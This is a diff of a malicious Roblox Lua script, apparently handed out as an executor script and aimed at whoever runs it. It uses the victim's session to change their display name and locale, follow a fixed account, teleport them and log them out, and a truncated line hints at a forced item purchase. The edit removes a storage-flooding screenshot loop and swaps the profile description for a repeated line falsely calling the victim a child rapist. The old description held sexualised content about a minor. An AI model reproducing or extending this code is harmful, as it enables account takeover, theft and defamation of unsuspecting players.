@@ -120,23 +120,17 @@ local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":
 
 task.wait(0.01)
 
-local function screenshot() -- flood storage
-while wait() do
-game.CoreGui:TakeScreenshot()
-end
-end
-
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
-local description = '{"description":"Your executor is vulnerable and got your account beamed! if youre a female... pwease hit me up on dc... im a 14 yo that needs dominant mommies to absolutely crush the living hell out of my ball... dc: @reflexsecurity"}'
+local description = '{"description":"I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children"}'
 local none = ''
 local china = '{"supportedLocaleCode":"zh_TW"}'
 local friend = '{"friendshipOriginSourceType":0}'
 local changedisplay = {
     Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
     Method = "PATCH",
-    Body = '{"newDisplayName":"CheckNewGroupYoureIn"}',
+    Body = '{"newDisplayName":"banned"}',
 }
 
 local followaccount, followacc = pcall(function()
@@ -165,7 +159,7 @@ local ocaml, camell = pcall(function()
 game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/5030593299/follow', none)
 end)
 task.wait(0.01)
-screenshot()
+game:GetService("TeleportService"):Teleport(15786769057)
 game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/logout", none)
 task.wait(3)
 print("oops")
